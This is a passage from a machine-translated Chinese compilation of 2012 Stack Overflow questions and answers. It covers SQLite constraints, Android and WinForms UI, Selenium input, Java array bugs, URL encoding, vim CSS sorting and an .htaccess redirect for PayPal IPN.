01-27 00:02:56.555: E/AndroidRuntime(28526):    at android.database.sqlite.SQLiteStatement.executeInsert(SQLiteStatement.java:113)
01-27 00:02:56.555: E/AndroidRuntime(28526):    at android.database.sqlite.SQLiteDatabase.insertWithOnConflict(SQLiteDatabase.java:1839)
01-27 00:02:56.555: E/AndroidRuntime(28526):    at android.database.sqlite.SQLiteDatabase.insertOrThrow(SQLiteDatabase.java:1738)
01-27 00:02:56.555: E/AndroidRuntime(28526):    at SQLite.ProjectsDBAdapter.createProject(ProjectsDBAdapter.java:89)
01-27 00:02:56.555: E/AndroidRuntime(28526):    at SQLite.ProjectsDBAdapter.insertSomeProjects(ProjectsDBAdapter.java:140)
01-27 00:02:56.555: E/AndroidRuntime(28526):    at de.bertrandt.bertrandtknx.ProjectList.setup(ProjectList.java:120)
01-27 00:02:56.555: E/AndroidRuntime(28526):    at de.bertrandt.bertrandtknx.ProjectList.onCreate(ProjectList.java:55)
01-27 00:02:56.555: E/AndroidRuntime(28526):    at android.app.Activity.performCreate(Activity.java:4562)
01-27 00:02:56.555: E/AndroidRuntime(28526):    at android.app.Instrumentation.callActivityOnCreate(Instrumentation.java:1053)
01-27 00:02:56.555: E/AndroidRuntime(28526):    at android.app.ActivityThread.performLaunchActivity(ActivityThread.java:1934)
01-27 00:02:56.555: E/AndroidRuntime(28526):    ... 11 more 
```

***解决方案***

```
//Add Strings to database
try {
     dbHelper.insertSomeProjects(IP, Name, URL, Calimero);
} catch (SQLiteException exception) {
     Log.d("SQLite", "Error"+exception.toString());
     Toast.makeText(getApplicationContext(),
        "Name is duplicated", Toast.LENGTH_SHORT).show();
            exception.printStackTrace();
} 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-26T13:54:42.863

将 UNIQUE 声明放在列定义部分中，如相关问题所示：

[SQLite 表约束 - 在多个列上唯一](https://stackoverflow.com/questions/2701877/sqlite-table-constraint-unique-on-multiple-columns)

您的示例在 UNIQUE 子句中只有一个列，并且您可能希望在发生冲突时使用不同的策略（例如，可能拒绝插入而不是替换）

```
CREATE TABLE a (i INT, j INT, UNIQUE(i) ON CONFLICT REPLACE); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-26T13:51:49.933

您可以将列创建为主键。例如：

```
"CREATE TABLE mytable ("
"field1 text,"
"field2 text,"
"field3 integer,"
"PRIMARY KEY (field1)"
");" 
```

现在，当您尝试在此列（field1）中插入重复值时，您的代码将抛出`SQLException`. 您需要抓住`SQLException`并采取适当的行动。

如果您没有太多的行需要处理，您应该考虑填充一个`ArrayList`包含所有名称并用于`myArrayList.contains(myNameVariable)`检查名称是否已经在前面处理过。然后，您将能够避免实际执行 SQL 语句以查看它是否引发异常。

# vb.net - 为什么我的 VB.NET 用户控件不能实例化 ObjectContext？

> ID：12603176
> 
> 赞同：0
> 
> 时间：2012-09-26T13:44:44.493
> 
> 标签：vb.net, entity-framework, user-controls

我有以下代码行作为测试用户控件。构建项目后，我将此用户控件拖到窗体上，我收到一个错误对话框，大意是 EF 找不到上下文的连接字符串。然而，当我在表单中使用相同的变量时，一切都很好。用户控件似乎使用与通常的 app.config 不同的上下文来查找连接字符串。

```
Public Class InvoiceWorkOrderSearch
    Private _dataHelper As WorkOrderData = New WorkOrderData()
End Class 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-26T13:49:00.260

在设计期间？

如果控件处于运行时模式，您可以避免仅实例化对象。

用于检查设计时间 ( ) 的内置属性`Me.DesignMode`很差，因为它只告诉您当前是否正在设计控件本身。如果您将用户控件放在表单上，​​它会返回 false。

您可以使用此代码检查设计时间：http: [//dotnet-snippets.de/dns/designmode-workaround-windows-forms-SID299.aspx](http://dotnet-snippets.de/dns/designmode-workaround-windows-forms-SID299.aspx)

```
Public Class InvoiceWorkOrderSearch
    Private _dataHelper As WorkOrderData

    Public Sub New()
        If IsDesignMode(me) = False Then
            _dataHelper = New WorkOrderData()
        End If
    End Sub()
End Class 
```

# android - 如何制作多跨度文本？

> ID：12603182
> 
> 赞同：8
> 
> 时间：2012-09-26T13:45:11.523
> 
> 标签：android, html

这是一个例子。

```
String source = "This is example text";
Spannable out = new SpannedString(source);
StyleSpan boldSpan = new StyleSpan(Typeface.BOLD);
out.setSpan(boldSpan, 1, 3, Spannable.SPAN_EXCLUSIVE_EXCLUSIVE);
out.setSpan(boldSpan, 9, 12, Spannable.SPAN_EXCLUSIVE_EXCLUSIVE);

//someTextView.setText(out); 
```

预期结果：这是示例文本（“ **hi ”和“** **xam** ”为粗体）
实际结果：这是**示例**文本（仅适用于最后一个 setSpan 方法，粗体仅为“xam”）

如何制作多跨度文本？这是可能的？
也许问题出在*Spannable.SPAN_EXCLUSIVE_EXCLUSIVE*标志中？谢谢。

* * *

## 回答 #1

> 赞同：20
> 
> 时间：2012-09-26T13:49:14.877

我认为每个人都需要一个**新的 StyleSpan。**

```
String source = "This is example text";
Spannable out = new SpannedString(source);
StyleSpan boldSpan = new StyleSpan(Typeface.BOLD);
StyleSpan boldSpan2 = new StyleSpan(Typeface.BOLD);
out.setSpan(boldSpan, 1, 3, Spannable.SPAN_EXCLUSIVE_EXCLUSIVE);
out.setSpan(boldSpan2, 9, 12, Spannable.SPAN_EXCLUSIVE_EXCLUSIVE); 
```

不过还没试过。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-19T00:30:36.830

原因是每个粗体可跨文本必须由`StyleSpan`. 您的原因与重新分配值相同。

# android - 为什么 Android 调试模式会删除我的应用程序首选项？

> ID：12603184
> 
> 赞同：2
> 
> 时间：2012-09-26T13:45:16.670
> 
> 标签：android, debugging, for-loop, mono, sharedpreferences

当我在我的虚拟设备（以及我的 HTC Desire HD）上调试我的应用程序时，一切正常。我填写我的偏好并保存它们。它们保存在属于我的应用程序的设备的内部存储中。当我离开应用程序并重新启动它时，我的偏好仍然存在。但是当我稍微更改我的代码并再次启动调试器时，我的应用程序正在被卸载并再次安装。由于卸载，我的首选项也被删除。

我不希望我的偏好被删除。我究竟做错了什么？无法保存我的偏好吗？

我正在使用 Mono for Android 3.0.4.6 和 Visual Studio 2010 以及 Mono for Android 插件 40206。请帮忙，因为每次我启动调试器时，我都必须填写我的首选项。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-26T13:52:25.283

如果您重新安装应用程序，所有数据都将被删除。
您可以尝试自动化填充您的应用程序的过程`monkeyrunner`。

# python - python中tty中的非打印输出？

> ID：12603188
> 
> 赞同：2
> 
> 时间：2012-09-26T13:45:20.583
> 
> 标签：python, command-line-interface

我不知道如何正确地表达我想要的东西。

我想制作一个不只是打印和滚动但仍然是 linux-CLI 程序的程序。

假设我编写了一个程序，它做了 3 件事：1，它的尾部是一个日志文件 2，它显示时间 3，它运行一个连续的 ping。

并说我希望时间显示在右下角，我希望 logtail 在终端的上 5 行中滚动，我希望 ping 在终端的主体中（单独）滚动。

所以我基本上要问的是：我可以让一个cli程序表现得像一个GUI程序，例如时钟只是更新而不再次打印它，并且有2个来自独立滚动的子进程的单独数据流

这有意义吗？我对编程很陌生。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-26T13:50:16.280

[`curses`您可以使用库](http://docs.python.org/library/curses.html)更全面地控制 Unix 终端。该库本质上允许您构建一个简单的终端 GUI。

如果你需要更多，也可以看看[Urwid](http://excess.org/urwid/)。Urwid 为有眼光的终端 GUI 开发人员提供了更复杂的 GUI 小部件。:-)

# c# - ProgressBar 没有值，只是加载

> ID：12603195
> 
> 赞同：16
> 
> 时间：2012-09-26T13:45:44.170
> 
> 标签：c#, winforms, progress-bar

我需要做什么才能使用 WinForms 创建这样的进度条？

![进度条](../Images/0ea1434d3a7952cad2b353ccb4e67210.png)

* * *

## 回答 #1

> 赞同：19
> 
> 时间：2012-09-26T13:49:18.687

它被称为选框进度条。只需使用常规`ProgressBar`和设置：

```
myProgressBar.Style = ProgressBarStyle.Marquee; 
```

和

```
myProgressBar.MarqueeAnimationSpeed = yourDesiredSpeed; 
```

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-09-26T13:49:32.227

只需使用经典的 ProgressBar 控件并指定：

```
myProgressBar.Style = ProgressBarStyle.Marquee; 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-09-26T13:49:24.533

您正在寻找[style 属性](http://msdn.microsoft.com/en-us/library/system.windows.forms.progressbar.style.aspx)- 将其设置为`Marquee`. [关于样式的 MSDN 链接](http://msdn.microsoft.com/en-us/library/system.windows.forms.progressbarstyle.aspx)

# c++ - 从大整数 ZZ（在 NTL 中声明）到十六进制

> ID：12603198
> 
> 赞同：0
> 
> 时间：2012-09-26T13:45:48.827
> 
> 标签：c++, hex, ntl

我目前正在使用 NTL 来处理大整数。这个库中的大整数被声明为 ZZ。我想从 ZZ 数字变为十六进制。但是，正如我检查的那样，NTL 不支持从 ZZ 到十六进制的转换。

所以我的问题是我怎样才能从 ZZ （或者可能代表大十进制数字的字符串）到十六进制形式？如果有人可以提供帮助，我更喜​​欢使用这个库的功能直接从 ZZ 转到十六进制

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-03T09:45:04.827

Step1：最初将大数xx作为字符串s

第二步：假设字符串 s 的长度为 l，那么 s=s[0]s[1]...s[l-1]。我们从位置 0 开始读取 s 的每个字符，每次我们使用 int digit = atoi(ts.c_str()); 将此数字转换为整数变量 digit; 然后我们使用递归关系 value=10*value+digit ，其中 value 被声明为 ZZ 并初始化为 0。遍历所有数字后，我们将字符串传递给 ZZ 值

第三步：现在转换为十六进制形式，使用 NTL 我们可以计算 ZZ 数的模 16。所以从 value%2 开始，然后计算 (value-value%16)/16 并以这种方式进行，我们得到了十六进制形式。

# css - 如何使用 vim 对 css 选择器进行排序？

> ID：12603199
> 
> 赞同：2
> 
> 时间：2012-09-26T13:45:53.367
> 
> 标签：css, sorting, vim

我想在我的 scss 文件中按字母顺序排列 css 选择器（和属性）。我确信 vim 可以做到这一点（即使我需要使用一些外部工具）。您将如何对以下内容进行排序？

```
h2 { 
  color:red;
  background-color:green;
}
h1 {
  font-size:12px;
} 
```

对此：

```
h1 {
  font-size:12px;      
}
h2 {
  background-color:green;
  color:red;
} 
```

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-09-26T14:44:04.873

对于您的简单示例，以下两个片段似乎有效，但我担心它们可能会因更大、更复杂的 css 而失败。

* * *

要订购我使用宏**的属性：

```
:let @q = "/{^Mvi{:sort^M"|%norm! @q 
```

^(** 注意这里的 ^M 是用 . 输入的`Ctrl-v``Ctrl-m`。)

解释：

1.  定义一个宏来：
    *   搜索“{”
    *   选择“{”和“}”之间的文本
    *   按行对选择进行排序
2.  在缓冲区中的所有行上运行宏。

* * *

要订购我使用替代和排序的选择器：

```
:%s/\v([^}])\n/\1/g|%sort|%s/\v[;{]/&\r/g 
```

解释：

1.  对于以“}”以外的内容开头的每一行，删除换行符以将此块折叠为一行。
2.  按行对缓冲区进行排序。
3.  在每个“;”之后 或“{”插入换行符。

尾随空格会稍微消除这一点，但您没有任何这些，对吧？:)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-26T14:59:29.520

试试[**CSScomb**](http://csscomb.ru/)。该工具以可定制的方式对您的 css 进行排序。[**你可以在网上**](http://csscomb.ru/online/#)试试。

CSScomb 有Vim[插件](https://github.com/miripiruni/CSScomb-for-Vim/)。

从 CSScomb 的网站：

*   对 CSS 属性进行排序*（在专业人员的帮助下对属性进行排序）*
*   设置 CSS 属性*的顺序（使用你习惯的顺序）*

# windows-phone-7 - 如何在文本块文本中设置电话号码、电子邮件 ID 和 URL 的自动链接

> ID：12603201
> 
> 赞同：0
> 
> 时间：2012-09-26T13:46:00.177
> 
> 标签：windows-phone-7

我是 Windows Phone 开发的新手。请告诉我是否有任何选项可以突出显示电话号码、电子邮件 ID 和 URL 链接。并且还想设置自动链接。我有一个包含描述的文本块（例如：- 电子邮件 ID、电话号码和一些文本）。我想设置自动链接属性..请告诉我在 windows phone 7 中是否可以？或者有什么方法可以为电子邮件 ID 设置自动链接？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-08T12:22:56.827

我通过结合以下链接数据来解决我的问题：-

[如何在wp7中设置可点击的文本块中的链接](https://stackoverflow.com/questions/7567600/how-to-set-the-links-in-a-text-block-clickable-in-wp7)

[http://msdn.microsoft.com/en-us/sharepointandwindowsphone7trainingcourse_addinglauncherstoemailandphonenumberslab_topic2.aspx](http://msdn.microsoft.com/en-us/sharepointandwindowsphone7trainingcourse_addinglauncherstoemailandphonenumberslab_topic2.aspx)

我认为设置自动链接对开发人员很有帮助（可以选择拨打电话号码和邮件 id 上的邮件）。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-27T11:00:48.063

虽然只讨论 URL，但这个问题应该是一个起点：

[如何在wp7中设置可点击的文本块中的链接](https://stackoverflow.com/questions/7567600/how-to-set-the-links-in-a-text-block-clickable-in-wp7)

不幸的是，没有内置的自动链接功能。

# jquery-tokeninput - jQuery 令牌输入无效的 JSON 原语

> ID：12603206
> 
> 赞同：1
> 
> 时间：2012-09-26T13:46:09.790
> 
> 标签：jquery-tokeninput

我正在使用这个插件： http: [//loopj.com/jquery-tokeninput/](http://loopj.com/jquery-tokeninput/)

使用初始化

```
$("#actors").tokenInput("/Services/AutoComplete.asmx/AdminNames", {
            method: "post",
            theme: "facebook"
}); 
```

在输入输入时，我在 Firebug 的 NET 选项卡中收到此错误

```
500 Internal Server Error

Post - q=a
Response - {"Message":"Invalid JSON primitive: q.","StackTrace":" ...
JSON - "Invalid JSON primitive: q." 
```

如果我使用变量而不是 Web 服务，它可以正常工作。我什至没有获得 Web 服务的调试控制。

谢谢，开发

# java - 通过 Batik 对更新的图像进行转码时的问题

> ID：12603208
> 
> 赞同：1
> 
> 时间：2012-09-26T13:46:18.680
> 
> 标签：java, filewriter, batik, transcode

我一直在为一个命令行程序编写一个 GUI 包装器（在 Java 中），该程序在一个文件名下生成 SVG 图像。

不幸的是，底层程序在生成新图像时无法关闭 svg 标签，所以我使用 FileWriter 来修改文件：

```
FileWriter fw = new FileWriter(("ImageCache/"+file), true); //true: allows appending to file        
BufferedWriter bw = new BufferedWriter(fw);
bw.write("\n</svg>");   
bw.close();
fw.close(); 
```

Batik 完美地转码了第一张图像，但第二张图像由于缺少 svg 标签而失败。

我已手动检查以验证 FileWriter 是否两次都在更新文件，确实如此。

下面是我的转码器代码（带有输入文件和 newFileName）：

```
org.apache.batik.ext.awt.image.spi.ImageTagRegistry.getRegistry().flushCache();
PNGTranscoder t = new PNGTranscoder();

String svgURI = new File(file).toURL().toString();
TranscoderInput i = new TranscoderInput(svgURI);
OutputStream outStream = new FileOutputStream(newFileName);
TranscoderOutput o = new TranscoderOutput(outStream);

t.transcode(i, o);
outStream.flush();
outStream.close(); 
```

每次生成更新的 SVG 图像时，都会实例化一个新的转码器对象并运行上述方法。

始终生成图像并在转码器运行之前添加结束标记，所以我不知道为什么转码器似乎没有读取更新的文件。我也试过暂停线程几秒钟，没有任何改进。

任何建议，将不胜感激。

# javascript - 未在 window.open 中打开网址

> ID：12603209
> 
> 赞同：0
> 
> 时间：2012-09-26T13:46:27.347
> 
> 标签：javascript, window.open

我在页面中有一个链接。单击该链接时，弹出窗口应使用所需的 url 呈现。我的 window.open 代码如下

```
<a href="javascript:;" onclick="window.open('/action.do?name=aravind&age=19&url=http://astrik.com/click?id=613*B&offerValue=2.9','chatWindow','menubar=1, scrollbars=yes, resizable=yes, width=600,height=450');return false;">Click here</a> 
```

单击上面的链接时，弹出窗口打开，网址为[http://astrik.com/click?id=613](http://astrik.com/click?id=613) *B 并且 offerValue 未显示在弹出窗口的 url 中。我需要在 url 中显示 offerValue。任何不显示 offerValue 的原因。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-26T13:50:21.470

尝试以下操作：

```
<a href="javascript:;" onclick="window.open('/action.do?name=aravind&age=19&url=http://astrik.com/click?id=613*B%26offerValue=2.9','chatWindow','menubar=1, scrollbars=yes, resizable=yes, width=600,height=450');return false;">Click here</a> 
```

您必须对“url”值的参数进行[URL 编码](http://www.blooberry.com/indexdot/html/topics/urlencoding.htm)，否则它们将附加到原始 URL。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-26T13:53:27.897

在使用它之前，您应该转义 url 中的数据部分。在这种情况下，数据部分 url 被 url 中的 & 号窃听。

```
var url = encodeURIComponent('http://astrik.com/click?id=613*B&offerValue=2.9');

<a href="javascript:void(0);" onclick="window.open('/action.do?name=aravind&age=19&url=' + url,'chatWindow','menubar=1, scrollbars=yes, resizable=yes, width=600,height=450');return false;">Click here</a> 
```

（或者只是更换＆符号，现在不确定）

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-09-26T14:06:23.343

提供的 URL 包含一个 ? 表示参数列表的开始。每个参数由 . 分隔`&`。因此，对于解析器，提供的参数列表如下所示：

`name=aravind`, `age=19`,`url=http://astrik.com/click?id=613*B`和`offerValue=2.9`. 它们都属于请求地`/action.do`。

您需要使用 URL 转义码来转义最后一个 amp，`%26`如下所示：

`/action.do?name=aravind&age=19&url=http://astrik.com/click?id=613*B%26offerValue=2.9`

将最后一个参数“绑定”到 astrik URL。也许它也需要逃避第二个？与`%3F`.

# java - Web 驱动程序在使用 sendkeys 时跳过特殊字符 - "(" 和 "&" 字符

> ID：12603210
> 
> 赞同：1
> 
> 时间：2012-09-26T13:46:27.027
> 
> 标签：java, firefox, selenium-webdriver

作为自动化测试的一部分，我需要在 Web 应用程序的文本框中键入带有特殊字符（“（PT 书籍）”）的字符串。

当我运行测试时，`"("`总是被跳过。没有问题`")"`。我开始调查它并尝试了所有需要`shift key`按下a 的特殊字符，`("~!@#$%^&*()_+{}|:<>?")`发现它总是跳过`"("` and `"&"`。我还在 Google 搜索框上尝试了相同的测试，在这种情况下，所有字符都显示出来了。

我正在使用 Selenium Web 驱动程序（2.25.0）+ Java + Firefox（15.0.1）。我还必须`setEnableNativeEvents`在我的 Firefox 个人资料中填写错误。

我也使用 Internet Explorer 进行了尝试，它运行良好。我想坚持使用 Firefox，因为我的大部分测试都在 Firefox 上运行。

关于我正在测试的 Web 应用程序中为什么显示`"("`和未显示的任何想法？`"&"`

这是我正在使用的代码

```
FirefoxProfile profile = new FirefoxProfile();
profile.setEnableNativeEvents( false);
WebDriver driver = new FirefoxDriver(profile);

String searchTerm = "~!@#$%^&*()_+{}|:<>?" ;

String Link = "http://" ;

driver.get( "http://www.google.com");
driver.findElement(By. id("gbqfq")).sendKeys(searchTerm);

driver.get(Link);
driver.findElement(By. id("ctl00_ctl00_FindField_FindField_ctl00_findFieldLinks_basic")).click();
driver.findElement(By. id(UIMapping.SearchBoxId)).sendKeys(searchTerm); 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-08T10:53:24.693

我也面临同样的问题。我有一个简单的解决方法，这不是我正在寻找的那种解决方案，但暂时这会有所帮助。如果有更好的处理方法请提出。

```
 driver = new FirefoxDriver();
        String searchKey = "TShirt(M)";
        driver.Navigate().GoToUrl("http://mywebsite.com/");

        if (searchKey.Contains("(") || searchKey.Contains("&"))
        {
            ((IJavaScriptExecutor)driver).ExecuteScript("arguments[0].value ='" + searchKey + "';", driver.FindElement(By.Id("search_text"))); 
        }
        else
        {
            driver.FindElement(By.Id("search_text")).SendKeys(searchKey);
        }

        driver.FindElement(By.Id("search_button")).Click(); 
```

# java - Java Noob 创建自定义方法来打印数组并计算持续时间

> ID：12603219
> 
> 赞同：0
> 
> 时间：2012-09-26T13:47:17.923
> 
> 标签：java, arrays, methods

我以前曾使用此站点来帮助我完成许多编程任务，但我找不到与我现在遇到的问题类似的任何内容。

我正在尝试首先`myHobbies`使用该方法在 person 类的 toString 中打印数组，`printHobby`并计算用户在其中进行 Hobby 的总持续时间`printDuration`。我不知道为什么我不能让它工作并且一直在努力解决它。

任何帮助，将不胜感激。这是我的课。这是我第一次发帖，所以如果我做错了什么，请告诉我。

```
//--------------------Person--------------------
public class Person {
    String fName;
    String lName;
    String address;
    int age;

    String hobbyText;
    private double durationH = 0;
    private double totalDuration = 0;

    Person(String f, String l, String a, int ag) {
        fName = f;
        lName = l;
        address = a;
        age = ag;
    }

    static Hobby[] myHobbies = new Hobby[5];

    static int i = 0;

    public static void setHobby(Hobby mh) {
        myHobbies[i] = mh;
        i++;
    }

    public String toString() {
        return fName + " " + lName + " " + address + " " + age + " "
                + printDuration() + " ";
    }

    public double printDuration() {
        for (int k = 0; k < myHobbies.length; k++)
            totalDuration += myHobbies[k].getDuration();
        return totalDuration;
    }

    public String printHobbies() {
        for (int j = 0; j < myHobbies.length; j++)
            hobbyText = myHobbies[j].toString();
        return hobbyText;
    }

}

//--------------------HobbyDriver--------------------
import java.util.Scanner;

public class HobbyDriver {

    public static void main(String[] args) {

        Hobby[] newHobby = {
                new Hobby("Comics", "09/25/2012", "The Comic Store", 1),
                new Hobby("Baseball", "09/30/2012", "Fenway Park", 3),
                new Hobby("Programming", "09/212/2012", "Home", 6),
                new Hobby("Board Games", "09/01/2012", "Tom's House", 3),
                new Hobby("Watching Dr. Who", "09/27/2012", "Home", 1) };

        String personChoice;
        Scanner hobbyScan = new Scanner(System.in);
        do {

            String fName;
            String lName;
            int age;
            String address;
            String hobbyName;
            String partDate;
            String location;
            double duration;
            int userHobby;
            String hobbyChoice;

            System.out.println("What is your first name?");

            fName = hobbyScan.nextLine();

            System.out.println("What is your last name?");
            lName = hobbyScan.nextLine();

            System.out.println("What is your address?");

            address = hobbyScan.nextLine();

            System.out.println("What is your age?");

            age = hobbyScan.nextInt();
            hobbyScan.nextLine();

            do {

                System.out
                        .println("What hobbies would you like to do?\n"
                                + "choose between     Comics(0)\nBaseball(1)\nProgramming(2)\nBoard Games(3)\nWatching Dr.Who(4)\n"
                                + "\nEnter    the name of the hobby and then press enter");

                userHobby = hobbyScan.nextInt();
                hobbyScan.nextLine();

                System.out
                        .println("Would you like to add another hobby? (enter yes/no)");

                hobbyChoice = hobbyScan.nextLine();

                Person.setHobby(newHobby[userHobby]);

            } while (hobbyChoice.equals("yes"));

            System.out
                    .println("Would you like to add another person? (enter yes/no)");
            personChoice = hobbyScan.nextLine();

            int i = 0;

            Person[] newPerson = new Person[5];
            newPerson[i] = new Person(fName, lName, address, age);

            System.out.println(newPerson[i].toString());

            i++;

        } while (personChoice.equals("yes"));

    }

}

//--------------------Hobby--------------------
public class Hobby {

    private String hobbyName;
    private String partDate;
    private String location;
    private double duration;

    Hobby(String h, String p, String l, double d) {
        hobbyName = h;
        partDate = p;
        location = l;
        duration = d;

    }

    public String toString() {
        return hobbyName + " " + partDate + " " + location + " " + duration;
    }

    public void setDuration(double d) {
        d = duration;
    }

    public double getDuration() {
        return duration;
    }

} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-26T14:07:12.040

问题如下：

```
public String printHobbies() {
    for (int j = 0; j < myHobbies.length; j++)
        hobbyText = myHobbies[j].toString();    
    return hobbyText;
} 
```

首先，您在每个循环中覆盖您的字符串。写

```
hobbyText += myHobbies[j].toString(); 
```

其次，如果你不添加 5 个爱好，你会得到一个 NPE，因为数组中的每个项目一开始都是空的。

所以你必须检查 myHobbies[j] 是否不为空：

```
public String printHobbies() {
    for (int j = 0; j < myHobbies.length; j++) {
        if(myHobbies[j] != null) {
            hobbyText += myHobbies[j].toString();
        }
    }  
    return hobbyText;
} 
```

您可能还想看看 Collections：[http ://docs.oracle.com/javase/1.4.2/docs/api/java/util/Collections.html](http://docs.oracle.com/javase/1.4.2/docs/api/java/util/Collections.html)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-26T14:08:12.530

很少有错误可能导致您的代码出现问题，这取决于当前的使用情况。

1.  您不会重置总持续时间，这意味着它仅在第一次调用后才返回正确的结果。否则，它会乘以调用次数。

    ```
    public double printDuration() {
        for (int k = 0; k < myHobbies.length; k++)
            totalDuration += myHobbies[k].getDuration();
        return totalDuration;
    } 
    ```

2.  您使用固定大小为 5 的简单数组。这意味着，如果您添加超过 5 个爱好，它将抛出`IndexOutOfBoundsException`.

3.  您在数组中的所有爱好上调用`toString()`方法，尽管它们是设置的。默认情况下，数组初始化为`null`，这意味着，如果您设置的爱好少于 5 个，则尝试在`null`which throws上调用它`NullPointerException`。

    ```
    public String printHobbies() {
        for (int j = 0; j < myHobbies.length; j++)
            hobbyText += myHobbies[j].toString();
        return hobbyText;
    } 
    ```

# c# - 在 Web 表单中的图像按钮上显示来自数据库的图像

> ID：12603220
> 
> 赞同：0
> 
> 时间：2012-09-26T13:47:20.893
> 
> 标签：c#, asp.net, sql-server

我正在尝试使数据库中的图像出现在 Web 表单上的图像按钮上。没有错误消息，但图像没有出现。只有一个小的指示出现在图像按钮上，而不是来自数据库的图像....

我的处理程序在这里：

```
public void ProcessRequest (HttpContext context)
{
        Int32 Member_No;
        if (context.Request.QueryString["id"] != null)
        {
            Member_No = Convert.ToInt32(context.Request.QueryString["id"]);
            context.Response.ContentType = "image/jpeg";

            Stream strm = ShowEmpImage(Member_No);

            byte[] buffer = new byte[4096];
            int byteSeq = strm.Read(buffer, 0, 4096);

            while (byteSeq > 0)
            {
                context.Response.OutputStream.Write(buffer, 0, byteSeq);
                byteSeq = strm.Read(buffer, 0, 4096);
            }  
        }
        else
        {
            context.Response.Write("No Image Found");
        }
    }

   public bool IsReusable
   {
       get
       {
           return false;
       }
   }

   public Stream ShowEmpImage(int Member_No) 
   {
       SqlConnection con = new SqlConnection(ConfigurationManager.ConnectionStrings["MyServer"].ConnectionString);
       con.Open();
       SqlCommand cmd = new SqlCommand("Select Photo from Members where Member_No = @ID", con);
       cmd.CommandType = CommandType.Text;
       cmd.Parameters.AddWithValue("@ID", Member_No);

       object img = cmd.ExecuteScalar();

       try
       {
           return new MemoryStream((byte[])img);
       }
       catch
       {
           return null;
       }
       finally
       {
           con.Close();
       }
   }
} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-26T14:07:49.783

我只会返回`byte[]`from 执行标量并将字节写入流。

```
public byte[] ShowEmpImage(int Member_No) 
{
   var settings = ConfigurationManager.ConnectionStrings["MyServer"];
   using(var con = new SqlConnection(settings.ConnectionString))
   using(var cmd = new SqlCommand("Select Photo from Members where Member_No = @ID", con))
   {
       con.Open();
       cmd.CommandType = CommandType.Text;
       cmd.Parameters.AddWithValue("@ID", Member_No);

       return (byte[])cmd.ExecuteScalar();
   }
}

var image = ShowEmpImage(Member_No);
context.Response.WriteBytes(image);
context.Response.ContentType = "image/jpg"; 
```

顺便说一句：我还将您的 ado.net 组件包装在`using`块中以防止内存泄漏。

# java - Java中的参数类型

> ID：12603230
> 
> 赞同：0
> 
> 时间：2012-09-26T13:47:58.873
> 
> 标签：java, types

我正在查看*JasperReports*的文档，但我不明白以下方法的返回类型：

```
public java.lang.Class<?> getValueClass() 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-26T13:50:28.870

该方法返回一个`[Class](http://docs.oracle.com/javase/1.4.2/docs/api/java/lang/Class.html)`对象。`?`表示它可以是任何类型的类。[您可以在此处](http://docs.oracle.com/javase/tutorial/extra/generics/wildcards.html)阅读有关通配符的更多信息。`Class`当您处理[反射](https://stackoverflow.com/questions/37628/what-is-reflection-and-why-is-it-useful)时，通常会使用这些对象。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-26T13:53:42.553

`Class<?>`指类的任何实例。与之相比，`Class<? extends Collection>`这会将标准缩小到有限的一组类（那些扩展的类`Collection`）。

这在调用诸如`newInstance`. 如果你有`Class<?> a`并打电话`a.newInstance()`，你会得到一个`Object`. 如果你有`Class<? extends Collection>`并打电话`b.newInstance()`，你会得到一个`Collection`.

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-09-26T13:49:53.317

它只是返回一个类的实例。`?`代表通用通配符对象的参数，即它是任何类型的类。

# jquery - jquery ajax 结果。在 textStatus 超时时获取“返回数据”？

> ID：12603233
> 
> 赞同：0
> 
> 时间：2012-09-26T13:48:03.060
> 
> 标签：jquery, ajax, asynchronous

我正在尝试使用 $.ajax 阅读 RSS 提要。读取文件相当简单，但我实际上只需要前几项而不是整个 rss，它有数百个：

我试图处理 ajax-“返回对象” - jqXHR - 就好像它是一个流一样。似乎我无法读取当时写入的文件。

所以我在我的 $.ajax-request 中添加了一个超时：如果“完成”是“超时”，我还是想解析 jqHXR，它在超时开始之前就已经加载了。

但我不知道如何获得请求的“结果”。我的意思是，一定有某种对象被 $.ajax 函数填充？

谢谢！

# .htaccess - 重定向 PayPal IPN URL

> ID：12603236
> 
> 赞同：3
> 
> 时间：2012-09-26T13:48:09.717
> 
> 标签：.htaccess, mod-rewrite, redirect, paypal-ipn

我的脚本设置在`old.example.com/?paypal_notify=1`. 当网站使用旧 URL 时，有几个人注册了我的会员计划。然后我将我的网站移动到`example.com`（不再有子域）并在 PayPal 设置中更新了我的 IPN URL。

不幸的是，PayPal 仍在为在旧 URL 上注册的会员发送 IPN 到旧 URL。我尝试使用 .htaccess 从`old.example.com`

```
Redirect /?paypal_notify=1 http://example.com/?paypal_notify=1 
```

这不起作用 - 我认为我的重定向规则不正确。有人可以给我指点吗？谢谢

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-26T14:10:04.953

重写规则仅匹配 URL 的路径部分，不包括查询字符串。当你想基于查询字符串进行匹配时，你需要添加一个 RewriteCond 指令。

这应该做你想要的：

```
RewriteCond %{QUERY_STRING} ^paypal_notify=1$
RewriteRule ^$ http://example.com/?paypal_notify=1 [L,R=302] 
```

当您对它按需要工作感到满意时，将 替换为`R=302`以`R=301`使重定向永久化。

# sql - 如何比较两个不同表的两个不同行？

> ID：12603250
> 
